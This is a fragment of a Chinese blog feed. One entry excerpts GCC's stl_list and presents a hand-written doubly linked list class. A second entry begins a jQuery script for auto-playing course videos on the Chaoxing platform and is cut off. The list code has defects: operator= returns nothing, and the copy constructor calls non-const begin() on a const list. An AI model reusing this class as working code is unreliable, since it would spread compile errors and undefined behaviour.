std::__addressof(_M_impl._M_node));<br>     &#125;<br><br><br> <span class="hljs-keyword">public</span>:<br>     <span class="hljs-keyword">typedef</span> _Alloc allocator_type;<br><br>     <span class="hljs-type">void</span><br>     _M_clear() _GLIBCXX_NOEXCEPT;<br><br>     <span class="hljs-type">void</span><br>     _M_init() _GLIBCXX_NOEXCEPT<br>     &#123;<br>       <span class="hljs-keyword">this</span>-&gt;_M_impl._M_node._M_next = &amp;<span class="hljs-keyword">this</span>-&gt;_M_impl._M_node;<br>       <span class="hljs-keyword">this</span>-&gt;_M_impl._M_node._M_prev = &amp;<span class="hljs-keyword">this</span>-&gt;_M_impl._M_node;<br>   _M_set_size(<span class="hljs-number">0</span>);<br>     &#125;<br>   &#125;;<br></code></pre></td></tr></table></figure><p>list类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp, <span class="hljs-keyword">typename</span> _Alloc = std::allocator&lt;_Tp&gt; &gt;<br>    <span class="hljs-keyword">class</span> list : <span class="hljs-keyword">protected</span> _List_base&lt;_Tp, _Alloc&gt;<br>    &#123;<br>      <span class="hljs-comment">// concept requirements</span><br>      <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> _Alloc::value_type                _Alloc_value_type;<br>      __glibcxx_class_requires(_Tp, _SGIAssignableConcept)<br>      __glibcxx_class_requires2(_Tp, _Alloc_value_type, _SameTypeConcept)<br><br>      <span class="hljs-keyword">typedef</span> _List_base&lt;_Tp, _Alloc&gt;                    _Base;<br>      <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> _Base::_Tp_alloc_type         _Tp_alloc_type;<br>      <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> _Base::_Node_alloc_type       _Node_alloc_type;<br><br>    <span class="hljs-keyword">public</span>:<br>      <span class="hljs-keyword">typedef</span> _Tp                                        value_type;<br>      <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> _Tp_alloc_type::pointer           pointer;<br>      <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> _Tp_alloc_type::const_pointer     const_pointer;<br>      <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> _Tp_alloc_type::reference         reference;<br>      <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> _Tp_alloc_type::const_reference   const_reference;<br>      <span class="hljs-keyword">typedef</span> _List_iterator&lt;_Tp&gt;                        iterator;<br>      <span class="hljs-keyword">typedef</span> _List_const_iterator&lt;_Tp&gt;                  const_iterator;<br>      <span class="hljs-keyword">typedef</span> std::reverse_iterator&lt;const_iterator&gt;      const_reverse_iterator;<br>      <span class="hljs-keyword">typedef</span> std::reverse_iterator&lt;iterator&gt;            reverse_iterator;<br>      <span class="hljs-keyword">typedef</span> <span class="hljs-type">size_t</span>                                     size_type;<br>      <span class="hljs-keyword">typedef</span> <span class="hljs-type">ptrdiff_t</span>                                  difference_type;<br>      <span class="hljs-keyword">typedef</span> _Alloc                                     allocator_type;<br><br>    <span class="hljs-keyword">protected</span>:<br>      <span class="hljs-comment">// Note that pointers-to-_Node&#x27;s can be ctor-converted to</span><br>      <span class="hljs-comment">// iterator types.</span><br>      <span class="hljs-keyword">typedef</span> _List_node&lt;_Tp&gt;                _Node;<br><br>      <span class="hljs-keyword">using</span> _Base::_M_impl;<br>      <span class="hljs-keyword">using</span> _Base::_M_put_node;<br>      <span class="hljs-keyword">using</span> _Base::_M_get_node;<br>      <span class="hljs-keyword">using</span> _Base::_M_get_Tp_allocator;<br>      <span class="hljs-keyword">using</span> _Base::_M_get_Node_allocator;<br><br>       ..........................................................<br><br>&#125;<br></code></pre></td></tr></table></figure><p>大概截取了stl_list实现的一部分，主要为了体现stl_list的代码结构，具体接口实现可以查看源码。</p><h1 id="stl-list简单实现">stl-list简单实现</h1><h2 id="stl_list.h">STL_List.h</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> STL_LIST</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STL_LIST</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Def.h&quot;</span></span><br><br>__MUNDI_BEGIN<br><br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt; <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">list</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-comment">// The list node, the parent class maintains two pointers, and the subclass adds the specific value.</span><br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_node_base</span>  <br>  &#123;<br>    list_node_base* Next;<br>    list_node_base* Prev;<br><br>    <span class="hljs-built_in">list_node_base</span>():<span class="hljs-built_in">Next</span>(<span class="hljs-literal">nullptr</span>), <span class="hljs-built_in">Prev</span>(<span class="hljs-literal">nullptr</span>)&#123;&#125;<br>  &#125;;<br><br>  <span class="hljs-comment">// dataEntry node</span><br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_node</span>: <span class="hljs-keyword">public</span> list_node_base<br>  &#123;<br>     T dataEntry;<br>  &#125;;<br><br>  <span class="hljs-comment">// iterator</span><br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_iterator</span><br>  &#123;<br>    <span class="hljs-keyword">typedef</span> list_iterator   _Self;<br>    <span class="hljs-keyword">typedef</span> T               value_type;<br>    <span class="hljs-keyword">typedef</span> T*              pointer;<br>    <span class="hljs-keyword">typedef</span> T&amp;              reference;<br><br>    <span class="hljs-built_in">list_iterator</span>() _T_STD_NOEXCEPT<br>    &#123;<br>      m_smartPtr = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">list_iterator</span><span class="hljs-params">(list_node_base * pNode)</span> _T_STD_NOEXCEPT</span><br><span class="hljs-function">    </span>&#123;<br>      m_smartPtr = pNode;<br>    &#125;<br><br>    reference <span class="hljs-keyword">operator</span>*() _T_STD_NOEXCEPT<br>    &#123;<br>      <span class="hljs-keyword">return</span>  <span class="hljs-built_in">static_cast</span>&lt;list_node *&gt;(m_smartPtr)-&gt;dataEntry;<br>    &#125;<br><br>    list_node_base* <span class="hljs-keyword">operator</span>-&gt;() _T_STD_NOEXCEPT<br>    &#123;<br>      <span class="hljs-keyword">return</span> m_smartPtr;<br>    &#125;<br><br>    _Self <span class="hljs-keyword">operator</span>++(<span class="hljs-type">int</span>) _T_STD_NOEXCEPT <span class="hljs-comment">// post increment</span><br>    &#123;<br>      _Self __tmp = *<span class="hljs-keyword">this</span>;<br>      m_smartPtr = m_smartPtr-&gt;Next;<br>      <span class="hljs-keyword">return</span> __tmp;<br>    &#125;<br><br>    _Self&amp; <span class="hljs-keyword">operator</span>++() _T_STD_NOEXCEPT <span class="hljs-comment">// pre increment</span><br>    &#123;<br>      m_smartPtr = m_smartPtr-&gt;Next;<br>      <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>    &#125;<br><br>    _Self <span class="hljs-keyword">operator</span>--(<span class="hljs-type">int</span>) _T_STD_NOEXCEPT<br>    &#123;<br>      _Self __tmp = *<span class="hljs-keyword">this</span>;<br>      m_smartPtr = m_smartPtr-&gt;Prev;<br>      <span class="hljs-keyword">return</span> __tmp;<br>    &#125;<br><br>    _Self&amp; <span class="hljs-keyword">operator</span>--() _T_STD_NOEXCEPT<br>    &#123;<br>      m_smartPtr = m_smartPtr-&gt;Prev;<br>      <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>    &#125;<br><br>    <span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>==(<span class="hljs-type">const</span> list_iterator &amp; _Right) <span class="hljs-type">const</span> _T_STD_NOEXCEPT<br>    &#123;<br>      <span class="hljs-keyword">return</span> m_smartPtr == _Right.m_smartPtr;<br>    &#125;<br><br>    <span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>!=(<span class="hljs-type">const</span> list_iterator &amp; _Right) <span class="hljs-type">const</span> _T_STD_NOEXCEPT<br>    &#123;<br>       <span class="hljs-keyword">return</span> m_smartPtr != _Right.m_smartPtr;<br>    &#125;<br><br>    list_node_base * m_smartPtr; <span class="hljs-comment">// Node pointer</span><br>  &#125;;<br><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">typedef</span> list_iterator iterator;<br><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-built_in">list</span>()  <span class="hljs-comment">// Default constructor</span><br>  &#123; <br>    <span class="hljs-built_in">empty_init</span>();<br>  &#125;<br><br>  <span class="hljs-built_in">list</span>(<span class="hljs-type">const</span> list&lt;T&gt; &amp; rhs) <span class="hljs-comment">// Copy construction</span><br>  &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span> != &amp;rhs)<br>    &#123;<br>      <span class="hljs-built_in">empty_init</span>(); <span class="hljs-comment">// initialization</span><br><br>      iterator itrBegin = rhs.<span class="hljs-built_in">begin</span>();<br>      iterator itrEnd = rhs.<span class="hljs-built_in">end</span>();<br><br>      <span class="hljs-keyword">while</span>(itrBegin != itrEnd)<br>      &#123;<br>         list_node * tmp = <span class="hljs-built_in">static_cast</span>&lt;list_node *&gt;(itrBegin.m_smartPtr);<br><br>         <span class="hljs-built_in">push_back</span>(tmp-&gt;dataEntry);<br><br>         ++itrBegin;<br>      &#125;<br>    &#125;<br>  &#125;<br><br>  list &amp; <span class="hljs-keyword">operator</span> = (<span class="hljs-type">const</span> list&lt;T&gt; &amp; rhs) <span class="hljs-comment">// Assignment operator overloading</span><br>  &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span> != &amp;rhs)<br>    &#123;<br>      <span class="hljs-comment">// If the original list has a value, it will be emptied first.</span><br>      <span class="hljs-keyword">if</span>(<span class="hljs-built_in">begin</span>() != <span class="hljs-built_in">end</span>())<br>      &#123;<br>        <span class="hljs-built_in">clear</span>();<br>      &#125;<br><br>      iterator itrBegin = rhs.<span class="hljs-built_in">begin</span>();<br>      iterator itrEnd = rhs.<span class="hljs-built_in">end</span>();<br><br>      <span class="hljs-keyword">while</span>(itrBegin != itrEnd)<br>      &#123;<br>         list_node * tmp = <span class="hljs-built_in">static_cast</span>&lt;list_node *&gt;(itrBegin.m_smartPtr);<br><br>         <span class="hljs-built_in">push_back</span>(tmp-&gt;dataEntry);<br><br>         ++itrBegin;<br>      &#125;<br>    &#125;<br>  &#125;<br><br>  ~<span class="hljs-built_in">list</span>()  <span class="hljs-comment">// Destructor</span><br>  &#123;<br>    <span class="hljs-built_in">clear</span>();<br><br>    <span class="hljs-keyword">if</span>(pHeadNode)<br>    &#123;<br>      <span class="hljs-keyword">delete</span> pHeadNode;<br>      pHeadNode = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function">iterator <span class="hljs-title">begin</span><span class="hljs-params">()</span> _T_STD_NOEXCEPT</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">iterator</span>(pHeadNode-&gt;Next);<br>  &#125;<br><br>  <span class="hljs-function">iterator <span class="hljs-title">end</span><span class="hljs-params">()</span> _T_STD_NOEXCEPT</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">iterator</span>(pHeadNode);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push_back</span><span class="hljs-params">(<span class="hljs-type">const</span> T &amp; value)</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">insert</span>(<span class="hljs-built_in">end</span>(), value);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push_front</span><span class="hljs-params">(<span class="hljs-type">const</span> T &amp; value)</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">insert</span>(<span class="hljs-built_in">begin</span>(), value);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop_front</span><span class="hljs-params">()</span> </span><br><span class="hljs-function">  </span>&#123;<br>     <span class="hljs-built_in">erase</span>(<span class="hljs-built_in">begin</span>()); <br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop_back</span><span class="hljs-params">()</span> </span><br><span class="hljs-function">  </span>&#123; <br>    iterator tmp = <span class="hljs-built_in">end</span>();<br>    <span class="hljs-built_in">erase</span>(--tmp);<br>  &#125;<br><br>  <span class="hljs-function">T &amp; <span class="hljs-title">front</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> *<span class="hljs-built_in">begin</span>();<br>  &#125;<br><br>  <span class="hljs-function">T &amp; <span class="hljs-title">back</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> *(--<span class="hljs-built_in">end</span>());<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">const</span> T &amp; value)</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><br>    iterator itrBegin = <span class="hljs-built_in">begin</span>();<br>    <span class="hljs-keyword">while</span>(itrBegin != <span class="hljs-built_in">end</span>())<br>    &#123;<br>      <span class="hljs-keyword">if</span>(*itrBegin == value)<br>      &#123;<br>        itrBegin = <span class="hljs-built_in">erase</span>(itrBegin);<br>        ++count;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        ++itrBegin;<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> count;<br>  &#125;<br><br>  <span class="hljs-function">iterator <span class="hljs-title">erase</span><span class="hljs-params">(iterator position)</span></span><br><span class="hljs-function">  </span>&#123;<br>    list_node_base* next_node = position.m_smartPtr-&gt;Next;<br>    list_node_base* prev_node = position.m_smartPtr-&gt;Prev;<br>    prev_node-&gt;Next = next_node;<br>    next_node-&gt;Prev = prev_node;<br><br>    <span class="hljs-keyword">delete</span> position.m_smartPtr;<br>    position.m_smartPtr = <span class="hljs-literal">nullptr</span>;<br>    <br>    <span class="hljs-keyword">if</span>(_size &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      _size--;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">iterator</span>(next_node);<br>  &#125;<br><br>  <span class="hljs-function">iterator <span class="hljs-title">insert</span><span class="hljs-params">(iterator position, <span class="hljs-type">const</span> T&amp; x)</span> </span><br><span class="hljs-function">  </span>&#123;<br>    list_node* tmp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">list_node</span>();<br>    tmp-&gt;dataEntry = x;<br>    tmp-&gt;Next = position.m_smartPtr;<br>    tmp-&gt;Prev = position.m_smartPtr-&gt;Prev;<br>    position.m_smartPtr-&gt;Prev-&gt;Next = tmp;<br>    position.m_smartPtr-&gt;Prev = tmp;<br><br>    ++_size;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">iterator</span>(tmp);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">clear</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    iterator itrBegin = <span class="hljs-built_in">begin</span>();<br>    <span class="hljs-keyword">while</span>(itrBegin != <span class="hljs-built_in">end</span>())<br>    &#123;<br>      list_node* tmp =  <span class="hljs-built_in">static_cast</span>&lt;list_node *&gt;(itrBegin.m_smartPtr);<br><br>      ++itrBegin;<br><br>      <span class="hljs-keyword">if</span>(tmp)<br>      &#123;<br>        <span class="hljs-keyword">delete</span> tmp;<br>      &#125;<br>    &#125;<br><br>    pHeadNode-&gt;Next = pHeadNode;<br>    pHeadNode-&gt;Prev = pHeadNode;<br>    _size = <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> <span class="hljs-comment">// return length</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> _size;<br>  &#125;<br><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">empty_init</span><span class="hljs-params">()</span> </span><br><span class="hljs-function">  </span>&#123; <br>    pHeadNode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">list_node_base</span>();<br>    pHeadNode-&gt;Next = pHeadNode;  <span class="hljs-comment">// Initialize pointer to itself</span><br>    pHeadNode-&gt;Prev = pHeadNode;<br><br>    _size = <span class="hljs-number">0</span>;<br>  &#125;<br><br><span class="hljs-keyword">private</span>:<br>  list_node_base* pHeadNode; <span class="hljs-comment">// List head</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _size; <span class="hljs-comment">// the number of nodes, increase the efficiency of searching</span><br>&#125;;<br><br><br>__MUNDI_END<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="def.h">Def.h</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MUNDI_BEGIN namespace Mundi &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MUNDI_END &#125;</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _T_STD_NOEXCEPT</span><br><span class="hljs-meta"># <span class="hljs-keyword">if</span> __cplusplus &gt;= 201103L</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> _T_STD_NOEXCEPT noexcept</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> _T_STD_USE_NOEXCEPT noexcept</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> _T_STD_THROW(_EXC)</span><br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> _T_STD_NOEXCEPT</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> _T_STD_USE_NOEXCEPT throw()</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> _T_STD_THROW(_EXC) throw(_EXC)</span><br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Software Development</category>
      
    </categories>
    
    
    <tags>
      
      <tag>c++</tag>
      
      <tag>stl</tag>
      
      <tag>Source Code Analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>超星学习通开启自动播放模式</title>
    <link href="/2019/08/21/Learn-through-automatic-play-mode/"/>
    <url>/2019/08/21/Learn-through-automatic-play-mode/</url>
    
    <content type="html"><![CDATA[<blockquote><p>In three words I can sum up everything I’ve learned about life: itgoes on.<br />几个字足以概括我学到的人生：一切都在继续。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> fa = $(<span class="hljs-string">&quot;body&quot;</span>);<br><span class="hljs-keyword">var</span> btn = $(<span class="hljs-string">&quot;&lt;li&gt;&lt;/li&gt;&quot;</span>);<br><span class="hljs-keyword">var</span> json = &#123;<br>    <span class="hljs-string">&quot;background&quot;</span>: <span class="hljs-string">&quot;#66ccff&quot;</span>,<br>    <span class="hljs-string">&quot;height&quot;</span>: <span class="hljs-string">&quot;16px&quot;</span>,<br>    <span class="hljs-string">&quot;padding&quot;</span>: <span class="hljs-string">&quot;5px&quot;</span>,<br>    <span class="hljs-string">&quot;z-index&quot;</span>: <span class="hljs-number">0xFFFFF</span>,<br>    <span class="hljs-string">&quot;cursor&quot;</span>: <span class="hljs-string">&quot;pointer&quot;</span>,<br>    <span class="hljs-string">&quot;top&quot;</span>: <span class="hljs-string">&quot;300px&quot;</span>,<br>    <span class="hljs-string">&quot;right&quot;</span>: <span class="hljs-string">&quot;120px&quot;</span>,<br>    <span class="hljs-string">&quot;position&quot;</span>: <span class="hljs-string">&quot;fixed&quot;</span><br>&#125;;<br>btn.<span class="hljs-title function_">css</span>(json);<br>btn.<span class="hljs-title function_">html</span>(<span class="hljs-string">&quot;&lt;span id=&#x27;lfsenior&#x27;&gt;开启自动播放模式&lt;/span&gt;&quot;</span>);<br>fa.<span class="hljs-title function_">append</span>(btn);<br> <br>btn.<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br> <br>    <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-comment">//获取iframe</span><br>        <span class="hljs-keyword">var</span> video = 